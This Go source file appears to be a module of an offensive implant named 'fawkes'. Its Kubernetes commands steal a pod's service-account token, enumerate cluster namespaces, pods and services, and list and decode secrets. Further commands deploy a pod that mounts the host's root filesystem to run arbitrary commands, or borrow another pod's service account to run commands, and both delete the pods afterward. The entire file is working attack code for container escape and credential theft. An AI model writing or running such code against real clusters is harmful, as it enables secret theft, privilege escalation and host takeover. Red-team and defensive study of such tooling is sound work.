//go:build linux

package commands

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

const (
	k8sCAPath        = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
	k8sNamespacePath = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
)

// k8sTokenPath is defined in container_escape_helpers.go

// k8sClient holds authenticated HTTP client and API server info for K8s operations.
type k8sClient struct {
	client    *http.Client
	apiServer string
	token     string
	namespace string
}

// newK8sClient creates an authenticated K8s API client from service account credentials.
func newK8sClient() (*k8sClient, error) {
	// Read service account token
	tokenData, err := os.ReadFile(k8sTokenPath)
	if err != nil {
		return nil, fmt.Errorf("K8s service account token not found: %v", err)
	}
	token := strings.TrimSpace(string(tokenData))
	structs.ZeroBytes(tokenData)

	// Read namespace
	nsData, err := os.ReadFile(k8sNamespacePath)
	if err != nil {
		return nil, fmt.Errorf("K8s namespace not found: %v", err)
	}
	namespace := strings.TrimSpace(string(nsData))
	structs.ZeroBytes(nsData)

	// Discover API server from env
	host := os.Getenv("KUBERNETES_SERVICE_HOST")
	port := os.Getenv("KUBERNETES_SERVICE_PORT")
	if host == "" || port == "" {
		return nil, fmt.Errorf("KUBERNETES_SERVICE_HOST/PORT not set — not running in K8s")
	}
	apiServer := fmt.Sprintf("https://%s:%s", host, port)

	// Build TLS config with CA cert if available
	tlsConfig := &tls.Config{MinVersion: tls.VersionTLS12}
	if caData, err := os.ReadFile(k8sCAPath); err == nil {
		pool := x509.NewCertPool()
		pool.AppendCertsFromPEM(caData)
		tlsConfig.RootCAs = pool
		structs.ZeroBytes(caData)
	} else {
		tlsConfig.InsecureSkipVerify = true
	}

	client := &http.Client{
		Transport: &http.Transport{TLSClientConfig: tlsConfig},
		Timeout:   30 * time.Second,
	}

	return &k8sClient{
		client:    client,
		apiServer: apiServer,
		token:     token,
		namespace: namespace,
	}, nil
}

// k8sGet performs an authenticated GET to the K8s API.
func (k *k8sClient) k8sGet(path string) ([]byte, int, error) {
	req, err := http.NewRequest("GET", k.apiServer+path, nil)
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("Authorization", "Bearer "+k.token)
	req.Header.Set("Accept", "application/json")

	resp, err := k.client.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	return body, resp.StatusCode, err
}

// k8sPost performs an authenticated POST to the K8s API.
func (k *k8sClient) k8sPost(path string, jsonBody []byte) ([]byte, int, error) {
	req, err := http.NewRequest("POST", k.apiServer+path, strings.NewReader(string(jsonBody)))
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("Authorization", "Bearer "+k.token)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")

	resp, err := k.client.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	return body, resp.StatusCode, err
}

// k8sDelete performs an authenticated DELETE to the K8s API.
func (k *k8sClient) k8sDelete(path string) ([]byte, int, error) {
	req, err := http.NewRequest("DELETE", k.apiServer+path, nil)
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("Authorization", "Bearer "+k.token)

	resp, err := k.client.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	return body, resp.StatusCode, err
}

// escapeK8sEnum enumerates K8s resources: namespaces, pods, services, nodes.
func escapeK8sEnum(args containerEscapeArgs) (string, string) {
	kc, err := newK8sClient()
	if err != nil {
		return fmt.Sprintf("K8s enumeration failed: %v", err), "error"
	}
	defer structs.ZeroString(&kc.token)

	var sb strings.Builder
	sb.WriteString("=== KUBERNETES ENUMERATION ===\n\n")
	sb.WriteString(fmt.Sprintf("API Server: %s\n", kc.apiServer))
	sb.WriteString(fmt.Sprintf("Namespace:  %s\n", kc.namespace))
	sb.WriteString(fmt.Sprintf("Token:      %s...\n\n", kc.token[:min(30, len(kc.token))]))

	// List namespaces
	sb.WriteString("--- Namespaces ---\n")
	if data, code, err := kc.k8sGet("/api/v1/namespaces"); err == nil {
		if code == 200 {
			var nsList struct {
				Items []struct {
					Metadata struct {
						Name string `json:"name"`
					} `json:"metadata"`
					Status struct {
						Phase string `json:"phase"`
					} `json:"status"`
				} `json:"items"`
			}
			if json.Unmarshal(data, &nsList) == nil {
				for _, ns := range nsList.Items {
					sb.WriteString(fmt.Sprintf("  %s (%s)\n", ns.Metadata.Name, ns.Status.Phase))
				}
				sb.WriteString(fmt.Sprintf("  Total: %d namespace(s)\n", len(nsList.Items)))
			}
		} else {
			sb.WriteString(fmt.Sprintf("  Access denied (HTTP %d) — listing current namespace only\n", code))
		}
		structs.ZeroBytes(data)
	} else {
		sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
	}

	// List pods in current namespace (or specified)
	ns := kc.namespace
	if args.Path != "" {
		ns = args.Path // Allow overriding namespace via path param
	}
	sb.WriteString(fmt.Sprintf("\n--- Pods (namespace: %s) ---\n", ns))
	if data, code, err := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/pods", ns)); err == nil {
		if code == 200 {
			var podList struct {
				Items []struct {
					Metadata struct {
						Name      string `json:"name"`
						Namespace string `json:"namespace"`
					} `json:"metadata"`
					Status struct {
						Phase  string `json:"phase"`
						PodIP  string `json:"podIP"`
						HostIP string `json:"hostIP"`
					} `json:"status"`
					Spec struct {
						NodeName   string `json:"nodeName"`
						Containers []struct {
							Name  string `json:"name"`
							Image string `json:"image"`
						} `json:"containers"`
					} `json:"spec"`
				} `json:"items"`
			}
			if json.Unmarshal(data, &podList) == nil {
				for _, pod := range podList.Items {
					containers := make([]string, 0, len(pod.Spec.Containers))
					for _, c := range pod.Spec.Containers {
						containers = append(containers, c.Image)
					}
					sb.WriteString(fmt.Sprintf("  %-40s %s  IP:%s  Node:%s  [%s]\n",
						pod.Metadata.Name, pod.Status.Phase, pod.Status.PodIP,
						pod.Spec.NodeName, strings.Join(containers, ",")))
				}
				sb.WriteString(fmt.Sprintf("  Total: %d pod(s)\n", len(podList.Items)))
			}
		} else {
			sb.WriteString(fmt.Sprintf("  Access denied (HTTP %d)\n", code))
		}
		structs.ZeroBytes(data)
	} else {
		sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
	}

	// List services
	sb.WriteString(fmt.Sprintf("\n--- Services (namespace: %s) ---\n", ns))
	if data, code, err := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/services", ns)); err == nil {
		if code == 200 {
			var svcList struct {
				Items []struct {
					Metadata struct {
						Name string `json:"name"`
					} `json:"metadata"`
					Spec struct {
						Type      string `json:"type"`
						ClusterIP string `json:"clusterIP"`
						Ports     []struct {
							Port     int    `json:"port"`
							Protocol string `json:"protocol"`
						} `json:"ports"`
					} `json:"spec"`
				} `json:"items"`
			}
			if json.Unmarshal(data, &svcList) == nil {
				for _, svc := range svcList.Items {
					ports := make([]string, 0, len(svc.Spec.Ports))
					for _, p := range svc.Spec.Ports {
						ports = append(ports, fmt.Sprintf("%d/%s", p.Port, p.Protocol))
					}
					sb.WriteString(fmt.Sprintf("  %-30s %s  %s  [%s]\n",
						svc.Metadata.Name, svc.Spec.Type, svc.Spec.ClusterIP,
						strings.Join(ports, ",")))
				}
				sb.WriteString(fmt.Sprintf("  Total: %d service(s)\n", len(svcList.Items)))
			}
		} else {
			sb.WriteString(fmt.Sprintf("  Access denied (HTTP %d)\n", code))
		}
		structs.ZeroBytes(data)
	} else {
		sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
	}

	return sb.String(), "success"
}

// escapeK8sSecrets lists and reads K8s secrets (T1552.007).
func escapeK8sSecrets(args containerEscapeArgs) (string, string) {
	kc, err := newK8sClient()
	if err != nil {
		return fmt.Sprintf("K8s secrets access failed: %v", err), "error"
	}
	defer structs.ZeroString(&kc.token)

	ns := kc.namespace
	if args.Path != "" {
		ns = args.Path
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== KUBERNETES SECRETS (namespace: %s) ===\n\n", ns))

	// If a specific secret name is given via command param, read it directly
	if args.Command != "" {
		return k8sReadSecret(kc, ns, args.Command)
	}

	// List all secrets
	data, code, err := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/secrets", ns))
	if err != nil {
		return fmt.Sprintf("Failed to list secrets: %v", err), "error"
	}
	defer structs.ZeroBytes(data)

	if code != 200 {
		return fmt.Sprintf("Access denied listing secrets (HTTP %d)", code), "error"
	}

	var secretList struct {
		Items []struct {
			Metadata struct {
				Name      string `json:"name"`
				Namespace string `json:"namespace"`
			} `json:"metadata"`
			Type string `json:"type"`
			Data map[string]string `json:"data"`
		} `json:"items"`
	}
	if err := json.Unmarshal(data, &secretList); err != nil {
		return fmt.Sprintf("Failed to parse secrets: %v", err), "error"
	}

	for _, secret := range secretList.Items {
		keys := make([]string, 0, len(secret.Data))
		for k := range secret.Data {
			keys = append(keys, k)
		}
		sb.WriteString(fmt.Sprintf("  %-40s %s  keys:[%s]\n",
			secret.Metadata.Name, secret.Type, strings.Join(keys, ",")))
	}
	sb.WriteString(fmt.Sprintf("\nTotal: %d secret(s)\n", len(secretList.Items)))
	sb.WriteString("\nUse -command <secret-name> to read a specific secret's data\n")

	return sb.String(), "success"
}

// k8sReadSecret reads and decodes a specific K8s secret.
func k8sReadSecret(kc *k8sClient, namespace, secretName string) (string, string) {
	data, code, err := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/secrets/%s", namespace, secretName))
	if err != nil {
		return fmt.Sprintf("Failed to read secret '%s': %v", secretName, err), "error"
	}
	defer structs.ZeroBytes(data)

	if code != 200 {
		return fmt.Sprintf("Access denied reading secret '%s' (HTTP %d)", secretName, code), "error"
	}

	var secret struct {
		Metadata struct {
			Name      string `json:"name"`
			Namespace string `json:"namespace"`
		} `json:"metadata"`
		Type string `json:"type"`
		Data map[string]string `json:"data"`
	}
	if err := json.Unmarshal(data, &secret); err != nil {
		return fmt.Sprintf("Failed to parse secret: %v", err), "error"
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Secret: %s (type: %s) ===\n\n", secret.Metadata.Name, secret.Type))

	for key, encodedVal := range secret.Data {
		decoded, err := base64.StdEncoding.DecodeString(encodedVal)
		if err != nil {
			sb.WriteString(fmt.Sprintf("[%s] (decode error: %v)\n", key, err))
			continue
		}
		val := string(decoded)
		structs.ZeroBytes(decoded)
		sb.WriteString(fmt.Sprintf("[%s]\n%s\n\n", key, val))
	}

	return sb.String(), "success"
}

// escapeK8sDeploy creates a pod with a specified image and command.
func escapeK8sDeploy(args containerEscapeArgs) (string, string) {
	kc, err := newK8sClient()
	if err != nil {
		return fmt.Sprintf("K8s deploy failed: %v", err), "error"
	}
	defer structs.ZeroString(&kc.token)

	ns := kc.namespace
	if args.Path != "" {
		ns = args.Path
	}

	image := args.Image
	if image == "" {
		image = "alpine"
	}

	command := args.Command
	if command == "" {
		return "Required: -command '<command to run in pod>'", "error"
	}

	// Generate pod name
	podName := fmt.Sprintf("fawkes-%d", time.Now().Unix()%100000)

	// Create pod spec with host mount for breakout
	podSpec := map[string]interface{}{
		"apiVersion": "v1",
		"kind":       "Pod",
		"metadata": map[string]interface{}{
			"name":      podName,
			"namespace": ns,
		},
		"spec": map[string]interface{}{
			"restartPolicy": "Never",
			"containers": []map[string]interface{}{
				{
					"name":    "exec",
					"image":   image,
					"command": []string{"/bin/sh", "-c", command},
					"volumeMounts": []map[string]interface{}{
						{
							"name":      "hostfs",
							"mountPath": "/hostfs",
						},
					},
				},
			},
			"volumes": []map[string]interface{}{
				{
					"name": "hostfs",
					"hostPath": map[string]interface{}{
						"path": "/",
						"type": "Directory",
					},
				},
			},
		},
	}

	podJSON, _ := json.Marshal(podSpec)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Creating pod '%s' in namespace '%s'\n", podName, ns))
	sb.WriteString(fmt.Sprintf("[*] Image: %s\n", image))
	sb.WriteString(fmt.Sprintf("[*] Command: %s\n\n", command))

	data, code, err := kc.k8sPost(fmt.Sprintf("/api/v1/namespaces/%s/pods", ns), podJSON)
	if err != nil {
		return fmt.Sprintf("Failed to create pod: %v", err), "error"
	}
	structs.ZeroBytes(data)

	if code < 200 || code >= 300 {
		return fmt.Sprintf("Pod creation failed (HTTP %d): %s", code, string(data)), "error"
	}
	sb.WriteString("[+] Pod created\n")

	// Wait for pod to complete (poll status)
	for i := 0; i < 30; i++ {
		time.Sleep(2 * time.Second)
		statusData, statusCode, _ := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s", ns, podName))
		if statusCode != 200 {
			structs.ZeroBytes(statusData)
			continue
		}
		var podStatus struct {
			Status struct {
				Phase string `json:"phase"`
			} `json:"status"`
		}
		json.Unmarshal(statusData, &podStatus)
		structs.ZeroBytes(statusData)

		if podStatus.Status.Phase == "Succeeded" || podStatus.Status.Phase == "Failed" {
			sb.WriteString(fmt.Sprintf("[*] Pod phase: %s\n", podStatus.Status.Phase))
			break
		}
		if i == 29 {
			sb.WriteString(fmt.Sprintf("[!] Pod still in phase: %s (timeout)\n", podStatus.Status.Phase))
		}
	}

	// Get logs
	logData, logCode, logErr := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s/log?container=exec", ns, podName))
	if logErr == nil && logCode == 200 {
		sb.WriteString("\n--- Output ---\n")
		sb.WriteString(string(logData))
		structs.ZeroBytes(logData)
	} else {
		sb.WriteString("[!] Failed to retrieve pod logs\n")
	}

	// Cleanup: delete the pod
	kc.k8sDelete(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s", ns, podName))
	sb.WriteString("\n[+] Pod deleted\n")

	return sb.String(), "success"
}

// escapeK8sExec runs a command in an existing pod via ephemeral pod approach.
// Since K8s exec API requires SPDY/WebSocket, we create a short-lived pod
// that copies the target pod's service account and runs the command.
func escapeK8sExec(args containerEscapeArgs) (string, string) {
	if args.Command == "" {
		return "Required: -command '<pod-name> <command>'\nExample: -command 'nginx-pod-abc123 id'", "error"
	}

	// Parse "podname command" from command param
	parts := strings.SplitN(args.Command, " ", 2)
	if len(parts) < 2 {
		return "Format: -command '<pod-name> <command-to-run>'", "error"
	}
	targetPod := parts[0]
	execCmd := parts[1]

	kc, err := newK8sClient()
	if err != nil {
		return fmt.Sprintf("K8s exec failed: %v", err), "error"
	}
	defer structs.ZeroString(&kc.token)

	ns := kc.namespace
	if args.Path != "" {
		ns = args.Path
	}

	// Get the target pod's image to use same container
	podData, podCode, podErr := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s", ns, targetPod))
	if podErr != nil || podCode != 200 {
		return fmt.Sprintf("Failed to get pod '%s' (HTTP %d): %v", targetPod, podCode, podErr), "error"
	}

	var targetSpec struct {
		Spec struct {
			Containers []struct {
				Image string `json:"image"`
			} `json:"containers"`
			ServiceAccountName string `json:"serviceAccountName"`
		} `json:"spec"`
	}
	json.Unmarshal(podData, &targetSpec)
	structs.ZeroBytes(podData)

	image := "alpine"
	if len(targetSpec.Spec.Containers) > 0 && targetSpec.Spec.Containers[0].Image != "" {
		image = targetSpec.Spec.Containers[0].Image
	}
	if args.Image != "" {
		image = args.Image
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Target pod: %s (namespace: %s)\n", targetPod, ns))
	sb.WriteString(fmt.Sprintf("[*] Using image: %s\n", image))
	sb.WriteString(fmt.Sprintf("[*] Command: %s\n\n", execCmd))

	// Create ephemeral pod with same service account
	podName := fmt.Sprintf("fawkes-exec-%d", time.Now().Unix()%100000)
	podSpec := map[string]interface{}{
		"apiVersion": "v1",
		"kind":       "Pod",
		"metadata": map[string]interface{}{
			"name":      podName,
			"namespace": ns,
		},
		"spec": map[string]interface{}{
			"restartPolicy":      "Never",
			"serviceAccountName": targetSpec.Spec.ServiceAccountName,
			"containers": []map[string]interface{}{
				{
					"name":    "exec",
					"image":   image,
					"command": []string{"/bin/sh", "-c", execCmd},
				},
			},
		},
	}

	podJSON, _ := json.Marshal(podSpec)
	data, code, postErr := kc.k8sPost(fmt.Sprintf("/api/v1/namespaces/%s/pods", ns), podJSON)
	if postErr != nil || code < 200 || code >= 300 {
		return fmt.Sprintf("Failed to create exec pod (HTTP %d): %v\n%s", code, postErr, string(data)), "error"
	}
	structs.ZeroBytes(data)
	sb.WriteString(fmt.Sprintf("[+] Exec pod '%s' created\n", podName))

	// Poll for completion
	for i := 0; i < 30; i++ {
		time.Sleep(2 * time.Second)
		statusData, _, _ := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s", ns, podName))
		var podStatus struct {
			Status struct {
				Phase string `json:"phase"`
			} `json:"status"`
		}
		json.Unmarshal(statusData, &podStatus)
		structs.ZeroBytes(statusData)
		if podStatus.Status.Phase == "Succeeded" || podStatus.Status.Phase == "Failed" {
			sb.WriteString(fmt.Sprintf("[*] Pod phase: %s\n", podStatus.Status.Phase))
			break
		}
	}

	// Get logs
	logData, logCode, _ := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s/log?container=exec", ns, podName))
	if logCode == 200 {
		sb.WriteString("\n--- Output ---\n")
		sb.WriteString(string(logData))
		structs.ZeroBytes(logData)
	}

	// Cleanup
	kc.k8sDelete(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s", ns, podName))
	sb.WriteString("\n[+] Exec pod deleted\n")

	return sb.String(), "success"
}
